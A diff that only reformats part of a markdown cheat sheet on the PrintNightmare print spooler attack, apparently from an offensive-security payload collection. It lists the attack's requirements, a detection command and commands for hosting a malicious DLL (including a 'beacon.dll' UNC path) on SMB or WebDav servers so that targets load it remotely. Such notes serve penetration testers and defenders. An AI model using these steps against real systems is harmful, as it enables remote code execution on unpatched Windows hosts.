@@ -6,6 +6,7 @@ The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
 The exploit will execute the DLL either from the local filesystem or a remote share.
 
 Requirements:
+
 * **Spooler Service** enabled (Mandatory)
 * Server with patches < June 2021
 * DC with `Pre Windows 2000 Compatibility` group
@@ -14,6 +15,7 @@ Requirements:
 
 
 **Detect the vulnerability**:
+
 * Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)
   ```ps1
   python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
@@ -28,20 +30,23 @@ Requirements:
   ```
 
 **Payload Hosting**: 
+
 * The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109):
-```ps1
-python3 ./smbserver.py share /tmp/smb/
-```
+  ```ps1
+  python3 ./smbserver.py share /tmp/smb/
+  ```
 * Using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) (Admin rights required on host): 
-```ps1
-Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
-```
+  ```ps1
+  Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
+  ```
 * Using WebDav with [SharpWebServer](https://github.com/mgeeky/SharpWebServer) (Doesn't require admin rights):
-```ps1
-SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
-```
+  ```ps1
+  SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
+  ```
+
 When using WebDav instead of SMB, you must add `@[PORT]` to the hostname in the URI, e.g.: `\\172.16.1.5@8888\Downloads\beacon.dll`
 WebDav client **must** be activated on exploited target. By default it is not activated on Windows workstations (you have to `net start webclient`) and it's not installed on servers. Here is how to detect activated webdav:
+
 ```ps1
 cme smb -u user -p password -d domain.local -M webdav [TARGET]
 ```
